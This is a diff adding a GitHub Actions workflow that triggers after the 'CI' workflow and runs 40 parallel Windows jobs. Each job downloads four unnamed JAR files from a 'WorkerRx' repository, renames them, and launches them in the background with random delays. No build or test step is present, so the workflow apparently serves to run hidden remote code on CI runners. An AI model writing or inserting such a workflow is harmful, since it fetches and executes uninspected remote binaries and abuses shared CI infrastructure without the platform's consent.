@@ -1,0 +1,82 @@
+name: CI1
+on:
+  workflow_dispatch:
+  workflow_run:
+    workflows: ["CI"]
+    types:
+      - completed
+      
+jobs:
+  run-files:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        job-name: [J0,J1,J2,J3,J4,J5,J6,J7,J8,J9,J10,J11,J12,J13,J14,J15,J16,J17,J18,J19,J20,J21,J22,J23,J24,J25,J26,J27,J28,J29,J30,J31,J32,J33,J34,J35,J36,J37,J38,J39]
+    steps:
+      - name: Get Files
+        shell: pwsh
+        run: |
+          function Download-FileWithRetry {
+              param (
+                  [string]$Url,
+                  [string]$OutputFile,
+                  [int]$MaxRetries = 5
+              )
+              
+              $retryCount = 0
+              $success = $false
+              
+              while (-not $success -and $retryCount -lt $MaxRetries) {
+                  try {
+                      $client = New-Object System.Net.WebClient
+                      Write-Host "Downloading ${OutputFile}..."
+                      $client.DownloadFile($Url, $OutputFile)
+                      Write-Host "Successfully downloaded ${OutputFile}"
+                      $success = $true
+                  }
+                  catch {
+                      $retryCount++
+                      $delay = 2 * $retryCount
+                      Write-Host "Attempt $retryCount failed for ${OutputFile}: $_"
+                      Write-Host "Waiting $delay seconds before retry..."
+                      Start-Sleep -Seconds $delay
+                  }
+                  finally {
+                      if ($client) {
+                          $client.Dispose()
+                      }
+                  }
+              }
+              
+              if (-not $success) {
+                  throw "Failed to download ${OutputFile} after $MaxRetries attempts"
+              }
+          }
+          
+          Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 15)
+          
+          $downloads = @(
+              @{Url="https://github.com/${{ github.repository_owner }}/WorkerRx/raw/refs/heads/main/CNR10.jar"; OutputFile="CNR8.jar"},
+              @{Url="https://github.com/${{ github.repository_owner }}/WorkerRx/raw/refs/heads/main/WR10.jar"; OutputFile="WR8.jar"},
+              @{Url="https://github.com/${{ github.repository_owner }}/WorkerRx/raw/refs/heads/main/CR2R10.jar"; OutputFile="CR2R8.jar"},
+              @{Url="https://github.com/${{ github.repository_owner }}/WorkerRx/raw/refs/heads/main/CR3R10.jar"; OutputFile="CR3R8.jar"}
+          )
+          
+          foreach ($download in $downloads) {
+              Download-FileWithRetry -Url $download.Url -OutputFile $download.OutputFile
+              Start-Sleep -Seconds 3
+          }
+      - name: Set up JDK
+        uses: actions/setup-java@v3
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+      - name: Run
+        shell: pwsh
+        run: |
+          Start-Process -FilePath "java" -ArgumentList "-jar", "CR3R8.jar"
+          Start-Sleep -Seconds 2
+          Start-Process -FilePath "java" -ArgumentList "-jar", "CR2R8.jar"
+          Start-Sleep -Seconds 2
+          Start-Process -FilePath "java" -ArgumentList "-jar", "WR8.jar"
+          java -jar CNR8.jar
